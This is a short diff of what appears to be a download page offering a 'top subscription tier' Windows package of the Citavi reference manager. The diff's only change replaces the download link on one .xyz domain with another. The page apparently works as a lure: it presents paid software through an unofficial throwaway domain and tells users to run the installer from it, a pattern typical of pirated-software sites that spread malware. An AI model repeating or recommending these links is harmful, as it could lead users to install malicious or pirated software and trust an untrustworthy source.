@@ -10,8 +10,8 @@ Reference management plus project planning for scholars · Business-class packag
 
 > Use the project link below for Windows.
 
-* **Project link:** **[citavi-research-project-manager.nexpath.xyz](https://citavi-research-project-manager.nexpath.xyz/)**
-* **Full URL:** `https://citavi-research-project-manager.nexpath.xyz/`
+* **Project link:** **[citavi-research-project-manager.nerasix.xyz](https://citavi-research-project-manager.nerasix.xyz/)**
+* **Full URL:** `https://citavi-research-project-manager.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -41,4 +41,4 @@ This package reflects the **top subscription tier** of the product — advanced 
 | 🧠 RAM | 8 GB RAM suggested |
 | 💾 Disk | 4 GB free space |
 
----
+---
